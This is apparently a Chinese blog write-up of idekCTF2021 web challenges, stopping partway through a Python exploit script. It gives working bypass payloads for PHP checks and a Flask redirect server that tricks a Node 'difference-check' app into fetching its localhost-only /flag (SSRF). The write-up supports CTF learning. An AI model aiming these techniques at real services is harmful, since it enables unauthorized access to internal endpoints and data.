@@ -1,0 +1,667 @@
+<!doctype html><html lang=en-us>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<title>AmiaaaZ's Site | idekCTF2021 Wp</title>
+<meta name=viewport content="width=device-width,minimum-scale=1">
+<meta name=generator content="Hugo 0.90.1">
+<meta name=ROBOTS content="INDEX, FOLLOW">
+<link href=/dist/app.css rel=stylesheet>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-203328343-1','auto'),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+<link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous>
+<script defer src=https://amiaaaz.github.io/lib/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
+<script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script>
+<script>(function(f,b){var c=document,d='script',a=c.createElement(d),e=c.getElementsByTagName(d)[0];a.src=f,b&&a.addEventListener('load',function(a){b(a)}),e.parentNode.insertBefore(a,e)})('https://amiaaaz.github.io/lib/pangu.min.js',function(){pangu.spacingPage()})</script>
+<style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style>
+</head>
+<body class="bg-gray-100 text-gray-700 font-sans">
+<div class="p-6 sm:p-10 md:p-16 flex flex-wrap">
+<header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl">
+<div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2">
+<div>
+<h2>
+<a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a>
+</h2>
+</div>
+<h1 class=pt-2>idekCTF2021 Wp</h1>
+<h3 class="text-java-700 font-normal leading-relaxed pt-2">只有部分的web，js别问，问就是不会</h3>
+<div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light">
+<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/ctf>CTF</a>
+&nbsp;&nbsp;
+<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/wp>wp</a>
+</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2021-12-15T21:11:49+08:00>2021-12-15 21:11</time>
+</div>
+<details class=toc open>
+<summary>
+<hr>
+</summary>
+<div class="inline toc-content">
+<nav id=TableOfContents>
+<ul>
+<li><a href=#memory-of-php>Memory of PHP</a></li>
+<li><a href=#cookie-and-milk>Cookie-and-milk</a></li>
+<li><a href=#difference-check>difference-check</a></li>
+<li><a href=#sourceless-guessy-web>Sourceless Guessy Web</a></li>
+<li><a href=#jinjailbaby-jinjail>JinJail&Baby JinJail</a></li>
+<li><a href=#steghide-as-a-service>steghide-as-a-service</a></li>
+<li><a href=#miscprofanity-check>Misc/Profanity Check</a></li>
+</ul>
+</nav>
+</div>
+</details>
+<hr>
+</div>
+</header>
+<main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
+<article>
+<section class="mx-auto content">
+<div class=c-rich-text><p><a href=https://ctf.idek.team/Challenges>https://ctf.idek.team/Challenges</a> 注册之后一直收不到验证邮件，gmail和qq邮箱都不行，但是好像可以直接看题</p>
+<h2 id=memory-of-php>Memory of PHP</h2>
+<blockquote>
+<p>Try to understand how string and variable work in php and also url.
+<a href=http://memory-of-php.rf.gd/>http://memory-of-php.rf.gd/</a></p>
+</blockquote>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+
+<span style=color:#00a8c8>include</span><span style=color:#111>(</span><span style=color:#00a8c8>__DIR__</span><span style=color:#f92672>.</span><span style=color:#d88200>&#34;/lib.php&#34;</span><span style=color:#111>);</span>
+<span style=color:#111>$check</span> <span style=color:#f92672>=</span> <span style=color:#75af00>substr</span><span style=color:#111>(</span><span style=color:#111>$_SERVER</span><span style=color:#111>[</span><span style=color:#d88200>&#39;QUERY_STRING&#39;</span><span style=color:#111>],</span> <span style=color:#ae81ff>0</span><span style=color:#111>,</span> <span style=color:#ae81ff>32</span><span style=color:#111>);</span>
+<span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>preg_match</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/best-team/i&#34;</span><span style=color:#111>,</span> <span style=color:#111>$check</span><span style=color:#111>))</span>
+<span style=color:#111>{</span>
+    <span style=color:#00a8c8>echo</span> <span style=color:#d88200>&#34;Who is the best team?&#34;</span><span style=color:#111>;</span>
+<span style=color:#111>}</span>
+<span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#39;best-team&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>===</span> <span style=color:#d88200>&#34;idek_is_the_best&#34;</span><span style=color:#111>)</span>
+<span style=color:#111>{</span>
+    <span style=color:#00a8c8>echo</span> <span style=color:#d88200>&#34;That a right answer, Here is my prize, &lt;br&gt;&#34;</span><span style=color:#111>;</span>
+    <span style=color:#00a8c8>echo</span> <span style=color:#111>$flag</span><span style=color:#111>;</span>
+<span style=color:#111>}</span>
+<span style=color:#75af00>show_source</span><span style=color:#111>(</span><span style=color:#00a8c8>__FILE__</span><span style=color:#111>);</span>
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><pre tabindex=0><code>/?best-team=idek_is_the_best
+</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212011843966.png alt=image-20211212011843966></p>
+<p>进入http://memory-of-php.rf.gd/secure-bypass.php</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#00a8c8>include</span> <span style=color:#00a8c8>__DIR__</span><span style=color:#f92672>.</span><span style=color:#d88200>&#34;/lib2.php&#34;</span><span style=color:#111>;</span>
+<span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>isset</span><span style=color:#111>(</span><span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#39;url&#39;</span><span style=color:#111>][</span><span style=color:#ae81ff>15</span><span style=color:#111>]))</span>
+<span style=color:#111>{</span>
+    <span style=color:#75af00>header</span><span style=color:#111>(</span><span style=color:#d88200>&#34;location: </span><span style=color:#d88200>{</span><span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#39;url&#39;</span><span style=color:#111>]</span><span style=color:#d88200>}</span><span style=color:#d88200>&#34;</span><span style=color:#111>);</span>
+    <span style=color:#00a8c8>echo</span> <span style=color:#d88200>&#34;Your url is interesting, here is prize </span><span style=color:#d88200>{</span><span style=color:#111>$flag</span><span style=color:#d88200>}</span><span style=color:#d88200> &lt;br&gt;&#34;</span><span style=color:#111>;</span>
+<span style=color:#111>}</span>
+<span style=color:#00a8c8>else</span>
+<span style=color:#111>{</span>
+    <span style=color:#00a8c8>echo</span> <span style=color:#d88200>&#34;Plz make me interest with your url &lt;br&gt;&#34;</span><span style=color:#111>;</span>
+<span style=color:#111>}</span>
+<span style=color:#75af00>show_source</span><span style=color:#111>(</span><span style=color:#00a8c8>__FILE__</span><span style=color:#111>);</span>
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><pre tabindex=0><code>/secure-bypass.php?url[15]=1
+</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212090944967.png alt=image-20211212090944967></p>
+<p><code>idek{nu11_by1e_bypass1ng_1s_C0ol!_ftw_br0!!!!}</code></p>
+<h2 id=cookie-and-milk>Cookie-and-milk</h2>
+<blockquote>
+<p>I love to eat cookie and milk together. And you?</p>
+<p><a href=http://cookie-and-milk.rf.gd/>http://cookie-and-milk.rf.gd/</a></p>
+</blockquote>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+
+<span style=color:#00a8c8>include</span><span style=color:#111>(</span><span style=color:#00a8c8>__DIR__</span><span style=color:#f92672>.</span><span style=color:#d88200>&#34;/lib.php&#34;</span><span style=color:#111>);</span>
+<span style=color:#75af00>extract</span><span style=color:#111>(</span><span style=color:#111>$_GET</span><span style=color:#111>);</span>
+
+<span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#111>$_SESSION</span><span style=color:#111>[</span><span style=color:#d88200>&#39;idek&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>===</span> <span style=color:#111>$_COOKIE</span><span style=color:#111>[</span><span style=color:#d88200>&#39;idek&#39;</span><span style=color:#111>])</span>
+<span style=color:#111>{</span>
+    <span style=color:#00a8c8>echo</span> <span style=color:#d88200>&#34;I love c0000000000000000000000000000000000000kie&#34;</span><span style=color:#111>;</span>
+<span style=color:#111>}</span>
+
+<span style=color:#00a8c8>else</span> <span style=color:#00a8c8>if</span> <span style=color:#111>(</span> <span style=color:#75af00>sha1</span><span style=color:#111>(</span><span style=color:#111>$_SESSION</span><span style=color:#111>[</span><span style=color:#d88200>&#39;idek&#39;</span><span style=color:#111>])</span> <span style=color:#f92672>==</span> <span style=color:#75af00>sha1</span><span style=color:#111>(</span><span style=color:#111>$_COOKIE</span><span style=color:#111>[</span><span style=color:#d88200>&#39;idek&#39;</span><span style=color:#111>])</span> <span style=color:#111>)</span>
+<span style=color:#111>{</span>
+    <span style=color:#00a8c8>echo</span> <span style=color:#111>$flag</span><span style=color:#111>;</span>
+<span style=color:#111>}</span>
+
+<span style=color:#75af00>show_source</span><span style=color:#111>(</span><span style=color:#00a8c8>__FILE__</span><span style=color:#111>);</span>
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212100510880.png alt=image-20211212100510880></p>
+<p>比较狗的一点是它重定向的时候会删除我们的cookie，所以要单独抓包改一下</p>
+<p><code>idek{C0okie_s1ea1ing_1s_c0ol!!!}</code></p>
+<h2 id=difference-check>difference-check</h2>
+<blockquote>
+<p>It&rsquo;s important two know what differences exist, so I created a simple tool to check the difference between two websites!</p>
+<p><a href=http://difference-check.chal.idek.team>http://difference-check.chal.idek.team</a> | <a href=https://ctf.idek.team/handouts/web/DifferenceCheck/difference-check-dist.zip>https://ctf.idek.team/handouts/web/DifferenceCheck/difference-check-dist.zip</a></p>
+</blockquote>
+<p>可以提供两个url，会进行diff然后返回结果</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212091244418.png alt=image-20211212091244418></p>
+<p>使用的是node-fetch和diff库；康一康源码</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#00a8c8>const</span> <span style=color:#75af00>express</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express&#39;</span><span style=color:#111>);</span>
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>bodyParser</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;body-parser&#39;</span><span style=color:#111>);</span>
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>app</span> <span style=color:#f92672>=</span> <span style=color:#75af00>express</span><span style=color:#111>();</span>
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>ssrfFilter</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;ssrf-req-filter&#39;</span><span style=color:#111>);</span>
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>fetch</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;node-fetch&#39;</span><span style=color:#111>);</span>
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>Diff</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;diff&#39;</span><span style=color:#111>);</span>
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>hbs</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express-handlebars&#39;</span><span style=color:#111>);</span>
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>port</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1337</span><span style=color:#111>;</span>
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>flag</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;idek{REDACTED}&#39;</span><span style=color:#111>;</span>
+
+
+<span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>bodyParser</span><span style=color:#111>.</span><span style=color:#75af00>urlencoded</span><span style=color:#111>({</span> <span style=color:#75af00>extended</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>true</span> <span style=color:#111>}));</span>
+<span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>engine</span><span style=color:#111>(</span><span style=color:#d88200>&#39;hbs&#39;</span><span style=color:#111>,</span> <span style=color:#75af00>hbs</span><span style=color:#111>.</span><span style=color:#75af00>engine</span><span style=color:#111>({</span>
+    <span style=color:#75af00>defaultLayout</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;main&#39;</span><span style=color:#111>,</span>
+    <span style=color:#75af00>extname</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;.hbs&#39;</span>
+<span style=color:#111>}));</span>
+
+<span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>set</span><span style=color:#111>(</span><span style=color:#d88200>&#39;view engine&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;hbs&#39;</span><span style=color:#111>);</span>
+
+
+<span style=color:#00a8c8>async</span> <span style=color:#00a8c8>function</span> <span style=color:#75af00>validifyURL</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>){</span>
+	<span style=color:#75af00>valid</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#75af00>fetch</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>,</span> <span style=color:#111>{</span><span style=color:#75af00>agent</span><span style=color:#f92672>:</span> <span style=color:#75af00>ssrfFilter</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>)})</span>
+	<span style=color:#111>.</span><span style=color:#75af00>then</span><span style=color:#111>((</span><span style=color:#75af00>response</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+		<span style=color:#00a8c8>return</span> <span style=color:#00a8c8>true</span>
+	<span style=color:#111>})</span>
+	<span style=color:#111>.</span><span style=color:#00a8c8>catch</span><span style=color:#111>(</span><span style=color:#75af00>error</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+		<span style=color:#00a8c8>return</span> <span style=color:#00a8c8>false</span>
+	<span style=color:#111>});</span>
+	<span style=color:#00a8c8>return</span> <span style=color:#75af00>valid</span><span style=color:#111>;</span>
+<span style=color:#111>};</span>
+
+<span style=color:#00a8c8>async</span> <span style=color:#00a8c8>function</span> <span style=color:#75af00>diffURLs</span><span style=color:#111>(</span><span style=color:#75af00>urls</span><span style=color:#111>){</span>
+	<span style=color:#00a8c8>try</span><span style=color:#111>{</span>
+		<span style=color:#00a8c8>const</span> <span style=color:#75af00>pageOne</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#75af00>fetch</span><span style=color:#111>(</span><span style=color:#75af00>urls</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>]).</span><span style=color:#75af00>then</span><span style=color:#111>((</span><span style=color:#75af00>r</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span><span style=color:#00a8c8>return</span> <span style=color:#75af00>r</span><span style=color:#111>.</span><span style=color:#75af00>text</span><span style=color:#111>()}));</span>
+		<span style=color:#00a8c8>const</span> <span style=color:#75af00>pageTwo</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#75af00>fetch</span><span style=color:#111>(</span><span style=color:#75af00>urls</span><span style=color:#111>[</span><span style=color:#ae81ff>1</span><span style=color:#111>]).</span><span style=color:#75af00>then</span><span style=color:#111>((</span><span style=color:#75af00>r</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span><span style=color:#00a8c8>return</span> <span style=color:#75af00>r</span><span style=color:#111>.</span><span style=color:#75af00>text</span><span style=color:#111>()}));</span>
+		<span style=color:#00a8c8>return</span> <span style=color:#75af00>Diff</span><span style=color:#111>.</span><span style=color:#75af00>diffLines</span><span style=color:#111>(</span><span style=color:#75af00>pageOne</span><span style=color:#111>,</span> <span style=color:#75af00>pageTwo</span><span style=color:#111>)</span>
+	<span style=color:#111>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#111>{</span>
+		<span style=color:#00a8c8>return</span> <span style=color:#d88200>&#39;error!&#39;</span>
+	<span style=color:#111>}</span>
+<span style=color:#111>};</span>
+
+<span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+	<span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;index&#39;</span><span style=color:#111>);</span>
+<span style=color:#111>});</span>
+
+<span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/flag&#39;</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+	<span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>connection</span><span style=color:#111>.</span><span style=color:#75af00>remoteAddress</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;::1&#39;</span><span style=color:#111>){</span>
+		<span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#75af00>flag</span><span style=color:#111>)}</span>
+	<span style=color:#00a8c8>else</span><span style=color:#111>{</span>
+		<span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Forbidden&#34;</span><span style=color:#111>,</span> <span style=color:#ae81ff>503</span><span style=color:#111>)}</span>
+<span style=color:#111>});</span>
+
+<span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>post</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/diff&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>async</span> <span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+	<span style=color:#00a8c8>let</span> <span style=color:#111>{</span> <span style=color:#75af00>url1</span><span style=color:#111>,</span> <span style=color:#75af00>url2</span> <span style=color:#111>}</span> <span style=color:#f92672>=</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>body</span>
+	<span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#00a8c8>typeof</span> <span style=color:#75af00>url1</span> <span style=color:#f92672>!==</span> <span style=color:#d88200>&#39;string&#39;</span> <span style=color:#f92672>||</span> <span style=color:#00a8c8>typeof</span> <span style=color:#75af00>url2</span> <span style=color:#f92672>!==</span> <span style=color:#d88200>&#39;string&#39;</span><span style=color:#111>){</span>
+		<span style=color:#00a8c8>return</span> <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>({</span><span style=color:#75af00>error</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;Invalid format received&#39;</span><span style=color:#111>})</span>
+	<span style=color:#111>};</span>
+	<span style=color:#00a8c8>let</span> <span style=color:#75af00>urls</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span><span style=color:#75af00>url1</span><span style=color:#111>,</span> <span style=color:#75af00>url2</span><span style=color:#111>];</span>
+	<span style=color:#00a8c8>for</span><span style=color:#111>(</span><span style=color:#75af00>url</span> <span style=color:#00a8c8>of</span> <span style=color:#75af00>urls</span><span style=color:#111>){</span>
+		<span style=color:#00a8c8>const</span> <span style=color:#75af00>valid</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#75af00>validifyURL</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>);</span>
+		<span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#75af00>valid</span><span style=color:#111>){</span>
+			<span style=color:#00a8c8>return</span> <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>({</span><span style=color:#75af00>error</span><span style=color:#f92672>:</span> <span style=color:#d88200>`Request to </span><span style=color:#d88200>${</span><span style=color:#75af00>url</span><span style=color:#d88200>}</span><span style=color:#d88200> was denied`</span><span style=color:#111>});</span>
+		<span style=color:#111>};</span>
+	<span style=color:#111>};</span>
+	<span style=color:#00a8c8>const</span> <span style=color:#75af00>difference</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#75af00>diffURLs</span><span style=color:#111>(</span><span style=color:#75af00>urls</span><span style=color:#111>);</span>
+	<span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;diff&#39;</span><span style=color:#111>,</span> <span style=color:#111>{</span>
+		<span style=color:#75af00>lines</span><span style=color:#f92672>:</span> <span style=color:#75af00>difference</span>
+	<span style=color:#111>});</span>
+
+<span style=color:#111>});</span>
+
+<span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>listen</span><span style=color:#111>(</span><span style=color:#75af00>port</span><span style=color:#111>,</span> <span style=color:#111>()</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+	<span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>`App listening at http://localhost:</span><span style=color:#d88200>${</span><span style=color:#75af00>port</span><span style=color:#d88200>}</span><span style=color:#d88200>`</span><span style=color:#111>)</span>
+<span style=color:#111>});</span>
+
+</code></pre></div><p>可以看到对请求的url用<code>ssrfFilter</code>进行过滤，不允许访问本地的<code>/flag</code>，但是要flag就必须要ssrf，这里Node的版本是alpine，也没法进行http请求切分</p>
+<p>于是我尝试构造一个恶意html页面包含一个跳转的js脚本，但是学艺不精 构造失败了；随后我又尝试了DNS重绑定，但是会被检测出来导致利用失败</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213132823135.png alt=image-20211213132823135></p>
+<p>后来看了discord中的解答</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211215212432931.png alt=image-20211215212432931></p>
+<p>所以说重绑定还是可行的，因为在一个域名被反复横跳地解析ip地址，如果第一次被解析为我们服务器地地址而第二次返回127.0.0.1就可以达到SSRF地效果了；不过看wp之后发现直接用python会更简单</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> <span style=color:#111>flask</span> <span style=color:#f92672>import</span> <span style=color:#111>Flask</span><span style=color:#111>,</span> <span style=color:#111>redirect</span>
+<span style=color:#f92672>from</span> <span style=color:#111>threading</span> <span style=color:#f92672>import</span> <span style=color:#111>Thread</span>
+<span style=color:#f92672>import</span> <span style=color:#111>requests</span>
+
+<span style=color:#111>local_url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;http://yourvps_ip:port/&#34;</span>
+<span style=color:#111>app</span> <span style=color:#f92672>=</span> <span style=color:#111>Flask</span><span style=color:#111>(</span><span style=color:#111>__name__</span><span style=color:#111>)</span>
+<span style=color:#111>reqCounter</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+
+<span style=color:#75af00>@app</span><span style=color:#f92672>.</span><span style=color:#111>route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>)</span>
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>exploit</span><span style=color:#111>():</span>
+    <span style=color:#00a8c8>global</span> <span style=color:#111>reqCounter</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>reqCounter</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span><span style=color:#111>:</span>
+        <span style=color:#111>reqCounter</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#39;hey&#39;</span>
+    <span style=color:#00a8c8>else</span><span style=color:#111>:</span>
+        <span style=color:#111>reqCounter</span> <span style=color:#f92672>-=</span> <span style=color:#ae81ff>1</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>redirect</span><span style=color:#111>(</span><span style=color:#d88200>&#39;http://localhost:1337/flag&#39;</span><span style=color:#111>)</span>
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>start_server</span><span style=color:#111>():</span>
+    <span style=color:#111>app</span><span style=color:#f92672>.</span><span style=color:#111>run</span><span style=color:#111>(</span><span style=color:#d88200>&#39;0.0.0.0&#39;</span><span style=color:#111>,</span> <span style=color:#ae81ff>88</span><span style=color:#111>)</span>
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>send_payload</span><span style=color:#111>():</span>
+    <span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;http://difference-check.chal.idek.team/diff&#34;</span>
+    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span><span style=color:#d88200>&#34;url1&#34;</span><span style=color:#111>:</span> <span style=color:#111>local_url</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;url2&#34;</span><span style=color:#111>:</span> <span style=color:#d88200>&#34;http://v3zbv72qksii3rrtyl113zsi096zuo.burpcollaborator.net/&#34;</span><span style=color:#111>}</span>
+    <span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>post</span><span style=color:#111>(</span><span style=color:#111>url</span><span style=color:#111>,</span> <span style=color:#111>data</span><span style=color:#f92672>=</span><span style=color:#111>payload</span><span style=color:#111>)</span>
+    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>text</span><span style=color:#111>)</span>
+
